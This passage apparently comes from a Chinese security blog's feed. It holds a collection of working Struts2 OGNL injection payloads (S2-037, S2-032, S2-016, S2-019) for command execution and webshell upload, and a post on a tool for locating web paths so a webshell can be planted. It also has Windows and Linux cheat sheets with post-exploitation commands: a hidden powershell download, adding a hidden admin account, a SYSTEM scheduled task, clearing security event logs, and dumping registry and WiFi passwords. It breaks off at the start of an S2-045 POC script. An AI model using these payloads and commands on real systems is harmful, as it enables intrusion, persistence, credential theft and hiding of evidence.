<p>struts2_037<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1:8080/struts2-rest-showcase/orders/3/(%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS)%3f@java.lang.Runtime@getRuntime().exec(%23parameters.cmd):index.xhtml?cmd=calc</div><div class="line"></div><div class="line">http://127.0.0.1:8080/struts2-rest- showcase/orders/3/(%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS)%3F((%23writ%3D(%23attr%5B%23parameters.com%5B0%5D%5D).getWriter())%2C%23writ.println(3345*2356))%3Aindex.xhtml?com=com.opensymphony.xwork2.dispatcher.HttpServletResponse</div></pre></td></tr></table></figure></p>
<p>struts2_032<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?method:%23_memberAccess%3d%40ognl.OgnlContext%20%40DEFAULT_MEMBER_ACCESS%2c%23a%3d%40java.lang.Runtime%40getRuntime%28%29.exec%28%23parameters.command%20%5B0%5D%29.getInputStream%28%29%2c%23b%3dnew%20java.io.InputStreamReader%28%23a%29%2c%23c%3dnew%20%20java.io.BufferedReader%28%23b%29%2c%23d%3dnew%20char%5B51020%5D%2c%23c.read%28%23d%29%2c%23kxlzx%3d%20%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%2c%23kxlzx.println%28%23d%20%29%2c%23kxlzx.close&amp;<span class="built_in">command</span>=whoami</div></pre></td></tr></table></figure></p>
<p>获取磁盘目录：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23path%3d%23req.getRealPath(%23parameters.pp[0]),%23w%3d%23res.getWriter(),%23w.print(%23path),1?%23xx:%23request.toString&amp;pp=%2f&amp;encoding=UTF-8</div></pre></td></tr></table></figure></p>
<p>执行命令:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;cmd=whoami&amp;pp=\\A&amp;ppp=%20&amp;encoding=UTF-8</div></pre></td></tr></table></figure></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">method:%23_memberAccess[%23parameters.name1[0]]%3dtrue,%23_memberAccess[%23parameters.name[0]]%3dtrue,%23_memberAccess[%23parameters.name2[0]]%3d&#123;&#125;,%23_memberAccess[%23parameters.name3[0]]%3d&#123;&#125;,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew%20java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;name=allowStaticMethodAccess&amp;name1=allowPrivateAccess&amp;name2=excludedPackageNamePatterns&amp;name3=excludedClasses&amp;cmd=whoami&amp;pp=\\A&amp;ppp=%20&amp;encoding=UTF-8</div></pre></td></tr></table></figure>
<p>上传文件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23path%3d%23req.getRealPath(%23parameters.pp[0]),new%20java.io.BufferedWriter(new%20java.io.FileWriter(%23path%2b%23parameters.shellname[0]).append(%23parameters.shellContent[0])).close(),%23w.print(%23path),%23w.close(),1?%23xx:%23request.toString&amp;shellname=stest.jsp&amp;shellContent=tttt&amp;encoding=UTF-8&amp;pp=%2f</div></pre></td></tr></table></figure></p>
<p>struts2_016<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">redirect:<span class="variable">$&#123;%23res%3d%23context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),%23res.setCharacterEncoding(%22UTF-8%22),%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]&#123;%22whoami%22&#125;</span>)).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[20000],%23d.read(%23e),%23res.getWriter().println(%23e),%23res.getWriter().flush(),%23res.getWriter().close()&#125;</div></pre></td></tr></table></figure></p>
<p>struts2_019<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">debug=<span class="built_in">command</span>&amp;expression=%23res%3d%23context.get(<span class="string">"com.opensymphony.xwork2.dispatcher.HttpServletResponse"</span>),%23res.setCharacterEncoding(%22UTF-8%22),%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]&#123;%22whoami%22&#125;)).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[20000],%23d.read(%23e),%23res.getWriter().println(%23e),%23res.getWriter().flush(),%23res.getWriter().close()</div></pre></td></tr></table></figure></p>
<p><em>本文POC均来自网络收集，欢迎留言补充</em></p>
]]></content>
      
        <categories>
            
            <category> web安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> struts2 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[SearchWebPath]]></title>
      <url>http://thief.one/2017/03/10/SearchWebPath/</url>
      <content type="html"><![CDATA[<blockquote class="blockquote-center">真的猛士，敢于直面惨淡的人生，敢于正视淋漓的鲜血。<br>—— 鲁迅</blockquote>

<p>　　近日爆出的struts2-045漏洞可谓掀起了一波新的信息安全危机，基于该漏洞利用较为简单，适用范围广，因此受灾面积可想而知。然而在对某些站点进行安全检测时，难免会遇到一些问题，比如：如何写shell，如何提权等等。这里我针对如何寻找网站物理路径的问题，开发了一个小工具，可自动化的快速定位的网站物理路径，在此分享。<br>    <a id="more"></a><br>　　若需Struts2-045 POC或者检测工具，请前往：<a href="http://thief.one/2017/03/07/Struts2-045%E6%BC%8F%E6%B4%9E/">Struts2-045漏洞</a></p>
<p>　　免责申明：<em>本文不在于教唆如何利用struts2漏洞进行网站入侵，只用作技术探讨研究，本文涉及的工具请在下载后24小时内删除，不得用于商业或非法用途，否则后果自负</em></p>
<h3 id="工具应用场景"><a href="#工具应用场景" class="headerlink" title="工具应用场景"></a>工具应用场景</h3><p>利用某些特定漏洞，可远程执行命令，希望可以寻找到网站物理路径，写入一句话木马。</p>
<h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><ul>
<li>网站URL是静态的，而不是动态随机生成（即url路径必须与磁盘目录结构一致）</li>
<li>服务器支持上传文件</li>
</ul>
<h3 id="Function"><a href="#Function" class="headerlink" title="Function"></a>Function</h3><p>根据网站URL，如：www.xxx.com/a/b/c?id=1，判断出URL所在的网站物理路径地址，如：c:/web/cms/a/b/c。</p>
<h3 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h3><h4 id="python源码文件"><a href="#python源码文件" class="headerlink" title="python源码文件"></a>python源码文件</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python searchweburl.py -p <span class="string">"./"</span> -u <span class="string">"http://www.xxx.com/a/b/c/d?id=1"</span></div></pre></td></tr></table></figure>
<h4 id="windows绿色版"><a href="#windows绿色版" class="headerlink" title="windows绿色版"></a>windows绿色版</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">searchweburl.exe -p <span class="string">"./"</span> -u <span class="string">"http://www.xxx.com/a/b/c/d?id=1"</span></div></pre></td></tr></table></figure>
<h4 id="linux绿色版"><a href="#linux绿色版" class="headerlink" title="linux绿色版"></a>linux绿色版</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./searchweburl -p <span class="string">"./"</span> -u <span class="string">"http://www.xxx.com/a/b/c/d?id=1"</span></div></pre></td></tr></table></figure>
<h3 id="Parameter"><a href="#Parameter" class="headerlink" title="Parameter"></a>Parameter</h3><ul>
<li>-p –path　　　　待检测的磁盘路径</li>
<li>-u –url　　　　 待检测的网站url</li>
<li>-h –help　　　　帮助信息</li>
</ul>
<h3 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h3><p>针对于windows与linux操作系统，我分别搭建了2套网站，以便测试。</p>
<h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><p>在一台windows服务器上搭建了一个简单的web服务,访问如下：<br><img src="/upload_image/20170310/1.png" alt=""><br>　　假设此时我们已经拥有此服务器的shell，但需要在网站路径下写入一句话木马，然而手动寻找网站路径比较费时。将此searchweburl.py上传到服务器任意目录下（没有python环境可上传exe版本），windows下载远程文件命令可参考：<a href="http://thief.one/2017/03/08/Windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/">windows常用命令</a>。<br>运行如下命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">searchweburl.exe -p <span class="string">"e:/"</span> -u <span class="string">"http://localhost:8080/m_1_8/user/html/1.html"</span></div></pre></td></tr></table></figure></p>
<p>运行截图：<br><img src="/upload_image/20170310/2.png" alt=""><br>已经定位出此url所在的物理路径地址。</p>
<h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><p>在一台Linux服务器上搭建了一个简单的web服务,访问如下：<br><img src="/upload_image/20170310/3.png" alt=""><br>　　同样的，我们上传searchweburl.py或者seachweburl（linux免环境版），linux下载远程文件命令可参考：<a href="http://thief.one/2017/03/08/Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/">Linux常用命令</a>。<br>运行如下命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./searchweburl -p <span class="string">"/home"</span> -u <span class="string">"http://172.16.1.2:9990/b/a/b/c/d/1.html"</span></div></pre></td></tr></table></figure></p>
<p>运行截图：<br><img src="/upload_image/20170310/4.png" alt=""></p>
<h3 id="使用技巧"><a href="#使用技巧" class="headerlink" title="使用技巧"></a>使用技巧</h3><p>　　我们需要注意到的时，再选择url时尽量去挑选目录结构较多的，因为这样定位出来的结果就越准确。继续以上linux的例子，我们选择另外一个url，如：<a href="http://172.16.1.2:9990/b/a/1.html。" target="_blank" rel="external">http://172.16.1.2:9990/b/a/1.html。</a><br><img src="/upload_image/20170310/5.png" alt=""><br>可以看到URL的目录结构少了好几层，那么运行程序看看结果。<br><img src="/upload_image/20170310/6.png" alt=""><br>　　出现了2条结果，因为这2条结果都符合url目录结构，一般网站服务器上文件较多，因此选择目录层次较深的网站，可越精准得定位出结果。</p>
<h3 id="鸡肋问题"><a href="#鸡肋问题" class="headerlink" title="鸡肋问题"></a>鸡肋问题</h3><p>　　在我开发这个工具之前，曾用了5分钟的时间思考过此工具的应用场景是否广泛，以及其本身是否鸡肋。无论如何，我最终还是将其开发完成，因为我知道会有人需要它，即使它很鸡肋。</p>
<h3 id="SearchWebPath下载"><a href="#SearchWebPath下载" class="headerlink" title="SearchWebPath下载"></a>SearchWebPath下载</h3><p>windows免环境版：<a href="https://github.com/tengzhangchao/SearchWebPath/raw/master/windows/searchweburl.exe" target="_blank" rel="external">Searchweburl.exe</a><br>linux免环境版：<a href="https://github.com/tengzhangchao/SearchWebPath/raw/master/linux/searchweburl" target="_blank" rel="external">Searchweburl</a></p>
<p>Github项目地址：<a href="https://github.com/tengzhangchao/SearchWebPath" target="_blank" rel="external">https://github.com/tengzhangchao/SearchWebPath</a></p>
]]></content>
      
        <categories>
            
            <category> 安全工具 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Web路径问题 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Linux常用命令]]></title>
      <url>http://thief.one/2017/03/08/Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
      <content type="html"><![CDATA[<blockquote class="blockquote-center">即使跌倒了，你要懂得抓一把沙子在手里。<br></blockquote>

<p>分享一些自己常用的Linux命令，本文会持续更新，全当笔记备份。本文大部分内容来自互联网整理汇总，小部分来自个人经验所总结。<br><a id="more"></a></p>
<p>查看文件大小:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">du -sh  文件名</div></pre></td></tr></table></figure></p>
<p>杀死python相关的进程:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ps -aux | grep python | cut <span class="_">-d</span> <span class="string">' '</span> <span class="_">-f</span> 2 | xargs <span class="built_in">kill</span></div></pre></td></tr></table></figure></p>
<p>查看成功登陆ssh的IP地址：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">centos</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `grep <span class="string">'sshd'</span> /var/<span class="built_in">log</span>/secure* | grep -oE  <span class="string">'\&lt;([1-9]|[1-9][0-9]|1[0-9]&#123;2&#125;|2[01][0-9]|22[0-3])\&gt;(\.\&lt;([0-9]|[0-9][0-9]|1[0-9]&#123;2&#125;|2[0-4][0-9]|25[0-5])\&gt;)&#123;2&#125;\.\&lt;([1-9]|[0-9][0-9]|1[0-9]&#123;2&#125;|2[0-4][0-9]|25[0-4])\&gt;'</span> | sort  | uniq`; <span class="keyword">do</span> curl  <span class="_">-s</span> --header <span class="string">"X-Forwarded-For: <span class="variable">$i</span>"</span> http://1212.ip138.com/ic.asp |iconv -c <span class="_">-f</span> GB2312 -t utf-8 | grep -o -P <span class="string">'(?&lt;=\&lt;center\&gt;您的IP是：).*(?=&lt;\/center)'</span> ; <span class="keyword">done</span></div><div class="line"></div><div class="line">ubuntu：</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `grep <span class="string">'sshd'</span> /var/<span class="built_in">log</span>/auth.log* |grep <span class="string">'Accepted'</span> |grep ftp| grep -oE  <span class="string">'\&lt;([1-9]|[1-9][0-9]|1[0-9]&#123;2&#125;|2[01][0-9]|22[0-3])\&gt;(\.\&lt;([0-9]|[0-9][0-9]|1[0-9]&#123;2&#125;|2[0-4][0-9]|25[0-5])\&gt;)&#123;2&#125;\.\&lt;([1-9]|[0-9][0-9]|1[0-9]&#123;2&#125;|2[0-4][0-9]|25[0-4])\&gt;'</span> | sort  | uniq`; <span class="keyword">do</span> curl  <span class="_">-s</span> --header <span class="string">"X-Forwarded-For: <span class="variable">$i</span>"</span> http://1212.ip138.com/ic.asp |iconv -c <span class="_">-f</span> GB2312 -t utf-8 | grep -o -P <span class="string">'(?&lt;=\&lt;center\&gt;您的IP是：).*(?=&lt;\/center)'</span> ; <span class="keyword">done</span></div></pre></td></tr></table></figure></p>
<p>访问远程资源：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">wget　　作用：下载远程文件  如：http://www.xxx.com/1.txt</div><div class="line">curl　　作用：访问网页，返回包内容</div></pre></td></tr></table></figure></p>
<p>linux 复制特定后缀文件（保持目录结构）:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tar cvf my_txt_files.tar `find . -type f -name <span class="string">"*.jsp*"</span>`</div></pre></td></tr></table></figure></p>
<ul>
<li>watch 运行的脚本 -n 秒数　　（几秒钟执行一次，不加n默认为2秒）</li>
<li>nohup 要运行的程序 &amp;　　(让程序在后台运行，忽略所有挂断信号)</li>
</ul>
<p><em>本文将持续收集更新，欢迎大家留言补充！</em></p>
]]></content>
      
        <categories>
            
            <category> 技术研究 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> linux </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Windows常用命令]]></title>
      <url>http://thief.one/2017/03/08/Windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
      <content type="html"><![CDATA[<blockquote class="blockquote-center">除苦练内功之外，别无他法。<br></blockquote>

<p>分享一些自己常用的windows命令，本文会持续更新，全当笔记备份。本文大部分内容来自互联网整理汇总，小部分来自个人经验所总结。<br><a id="more"></a></p>
<h3 id="CMD常用命令"><a href="#CMD常用命令" class="headerlink" title="CMD常用命令"></a>CMD常用命令</h3><p>下载远程文件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">powershell -w hidden -c (new-object System.Net.WebClient).Downloadfile(<span class="string">'http://www.xxx.com/lcx.1'</span>,<span class="string">'d:\\3.txt'</span>)</div></pre></td></tr></table></figure></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bitsadmin /rawreturn /transfer getfile http://127.0.0.1:8080/test.zip F:\123.zip</div></pre></td></tr></table></figure>
<p>添加隐藏账号：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">net user <span class="built_in">test</span>$ <span class="built_in">test</span> /add       添加<span class="built_in">test</span>用户密码为<span class="built_in">test</span>的隐藏账号</div><div class="line">net localgroup administrators <span class="built_in">test</span>$ /add 把<span class="built_in">test</span>添加到系统用户组</div></pre></td></tr></table></figure></p>
<p>列出更新的补丁：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">wmic qfe list full /format:htable &gt; hotfixes.htm</div><div class="line">wmic qfe get description,installedOn</div></pre></td></tr></table></figure></p>
<p>在d盘根目录递归查找login.html文件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">cd</span> /d d: &amp;&amp; dir login.html /a<span class="_">-d</span>/b/s</div></pre></td></tr></table></figure></p>
<p>进入某盘符的某个目录下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">d: &amp; <span class="built_in">cd</span> d:/Clover</div></pre></td></tr></table></figure></p>
<p>重新打开一个cmd运行：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cmd /c  whoami</div></pre></td></tr></table></figure></p>
<p>添加计划任务：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">schtasks.exe  /Create /RU <span class="string">"SYSTEM"</span> /SC MINUTE /MO       </div><div class="line">45 /TN FIREWALL /TR <span class="string">"c:/1.ex    e"</span> /ED 2016/12/12</div><div class="line">可以把RU里面的system改为自己的账户名称，这样就可以执行添加计划任务了</div></pre></td></tr></table></figure></p>
<p>进程相关：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">tasklist   查看进程</div><div class="line">taskkill /im 进程名称</div><div class="line">taskkill /pid[进程码] -t(结束该进程) <span class="_">-f</span>(强制结束该进程以及所有子进程)</div></pre></td></tr></table></figure></p>
<p>查看windows系统未打的漏洞补丁：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">set</span> KB2829361=MS13-046&amp;<span class="built_in">set</span> KB2830290=MS13-046&amp;<span class="built_in">set</span> KB2667440=MS12-020&amp;<span class="built_in">set</span> KB2667402=MS12-020&amp;<span class="built_in">set</span> KB3124280=MS16-016&amp;<span class="built_in">set</span> KB3077657=MS15-077&amp;<span class="built_in">set</span> KB3045171=MS15-051&amp;<span class="built_in">set</span> KB2592799=MS11-080&amp;<span class="built_in">set</span> KB952004=MS09-012 PR&amp;<span class="built_in">set</span> KB956572=MS09-012 巴西烤肉&amp;<span class="built_in">set</span> KB970483=MS09-020 iis6&amp;<span class="built_in">set</span> KB2124261=MS10-065 ii7&amp;<span class="built_in">set</span> KB2271195=MS10-065 ii7&amp;systeminfo&gt;a.txt&amp;(<span class="keyword">for</span> %i <span class="keyword">in</span> (KB952004 KB956572 KB2393802 KB2503665 KB2592799 KB2621440 KB2160329 KB970483 KB2124261 KB977165 KB958644 KB2667402 KB2667440 KB2830290 KB2829361 KB3045171 KB3077657 KB3124280) <span class="keyword">do</span> @<span class="built_in">type</span> a.txt|@find /i <span class="string">"%i"</span>||@<span class="built_in">echo</span> %%i% Not Installed!)&amp;del /f /q /a a.txt</div></pre></td></tr></table></figure></p>
<p>获取保存在注册表中密码的键值：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">REG query HKCU  /v <span class="string">"pwd"</span> /s  <span class="comment">#pwd可替换为password \ HKCU 可替换为HKCR</span></div></pre></td></tr></table></figure></p>
<p>识别开机启动的程序:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wmic startup list full</div></pre></td></tr></table></figure></p>
<p>识别网卡中的IP与Mac：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wmic nicconfig get ipaddress,macaddress</div></pre></td></tr></table></figure></p>
<p>查看共享服务：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">wmic share get name,path</div><div class="line">net share</div></pre></td></tr></table></figure></p>
<p>查看系统中日志的位置：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wmic nteventlog get path,filename,writeable</div></pre></td></tr></table></figure></p>
<p>删除日志：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">wevtutil cl <span class="string">"windows powershell"</span></div><div class="line">wevtutil cl <span class="string">"security"</span></div><div class="line">wevtutil cl <span class="string">"system"</span></div></pre></td></tr></table></figure></p>
<p>运行的服务：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sc query <span class="built_in">type</span>= service</div><div class="line">net start</div></pre></td></tr></table></figure></p>
<p>安装的软件以及版本：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wmic product get name,version</div></pre></td></tr></table></figure></p>
<p>查看某个进程的详细情况：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wmic process <span class="built_in">where</span> name=<span class="string">"chrome.exe"</span> list full</div></pre></td></tr></table></figure></p>
<p>显示系统中曾连接过的无线密码：(以管理员身份运行)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">netsh wlan show profiles</div><div class="line">netsh wlan show profiles name=<span class="string">"profiles的名字"</span> key=clear</div></pre></td></tr></table></figure></p>
<p>一键获取：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> /f <span class="string">"skip=9 tokens=1,2 delims=:"</span> %i <span class="keyword">in</span> (<span class="string">'netsh wlan show profiles'</span>) <span class="keyword">do</span> @<span class="built_in">echo</span> %j | findstr -i -v <span class="built_in">echo</span> | netsh wlan show profiles %j key=clear</div></pre></td></tr></table></figure></p>
<p>查看是否为虚拟机：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wmic bios list full | find /i <span class="string">"vmware"</span></div></pre></td></tr></table></figure></p>
<p>是否支持powershell:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> defined PSModulePath (<span class="built_in">echo</span> 支持powershell) <span class="keyword">else</span> (<span class="built_in">echo</span> 不支持powershell)</div></pre></td></tr></table></figure></p>
<p>电脑产品编号与型号信息：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wmic baseboard get  Product,SerialNumber</div></pre></td></tr></table></figure></p>
<h3 id="CMD局域网命令"><a href="#CMD局域网命令" class="headerlink" title="CMD局域网命令"></a>CMD局域网命令</h3><p>arp -a 列出本网段内所有活跃的IP地址<br>arp -a 加对方IP是查对方的MAC地址<br>arp -s （ip + mac）绑定mac与ip地址<br>arp -d （ip + mac）解绑mac与ip地址</p>
<p>net view                  ——&gt; 查询同一域内机器列表<br>net view /domain    ——&gt; 查询域列表<br>net view /domain:domainname  —–&gt; 查看workgroup域中计算机列表</p>
<p>ipconfig /all            ——&gt; 查询本机IP段，所在域等<br>ipconfig /release<br>ipconfig /renew    重新获取Ip地址</p>
<p>telnet ip 端口号：尝试能否打开链接远程主机端口 nbtstat -a 加对方IP查对方的主机名<br>tracert 主机名   得到IP地址</p>
<p>netstat -a -n<br>netstat -an | find “3389”<br>netstat -a查看开启哪些端口<br>netstat -n查看端口的网络连接情况<br>netstat -v查看正在进行的工作<br>netstat -p tcp/ip查看某协议使用情况<br>netstat -s 查看正在使用的所有协议使用情况</p>
<p>nbtstat -n 获取NetBIOS<br>nslookup 域名   查询域名对应的ip</p>
<h3 id="DO常用快捷键"><a href="#DO常用快捷键" class="headerlink" title="DO常用快捷键"></a>DO常用快捷键</h3><p>mspaint　　画图工具<br>calc　　计算机<br>notepad　　记事本<br>taskmgr　　任务管理器<br>osk　　打开屏幕键盘<br>gpedit.msc　　组策略<br>services.msc　　本地服务<br>compmgmt.msc　　计算机管理<br>devmgmt.msc　　设备管理器<br>winver　　查看系统版本<br>magnify　　放大镜实用程序<br>eventvwr　　事件查看器<br>Regedit　　打开注册表<br>resmon　　资源监视器<br>WMIC BIOS get releasedate　　查看电脑生产日期<br>mstsc -f　　远程连接（可以全屏）</p>
<p><em>本文将持续收集更新，欢迎大家留言补充！</em></p>
]]></content>
      
        <categories>
            
            <category> 技术研究 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> windows </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Struts2_045漏洞]]></title>
      <url>http://thief.one/2017/03/07/Struts2-045%E6%BC%8F%E6%B4%9E/</url>
      <content type="html"><![CDATA[<p><blockquote class="blockquote-center">Struts2是个好东西</blockquote><br>免责申明：<em>文章中的工具等仅供个人测试研究，请在下载后24小时内删除，不得用于商业或非法用途，否则后果自负</em></p>
<p>　　Apache Struts 2被曝存在远程命令执行漏洞，漏洞编号S2-045，CVE编号CVE-2017-5638，在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵，漏洞评级为：高危。<br><a id="more"></a><br>漏洞详情：恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞进而执行系统命令。<br>风险等级：高风险。<br>漏洞风险：黑客通过利用漏洞可以实现远程命令执行。<br>影响版本：Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10。<br>安全版本：Struts 2.3.32或2.5.10.1。<br>修复建议：如您正在使用Jakarta文件上传插件，请升级Struts至安全版本。</p>
<p>更多参考：<a href="https://cwiki.apache.org/confluence/display/WW/S2-045" target="_blank" rel="external">https://cwiki.apache.org/confluence/display/WW/S2-045</a></p>
<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#! -*- encoding:utf-8 -*-</span></div><div class="line">import urllib2</div><div class="line">import sys</div><div class="line">from poster.encode import multipart_encode</div><div class="line">from poster.streaminghttp import register_openers</div><div class="line"></div><div class="line">def poc(url):</div><div class="line">    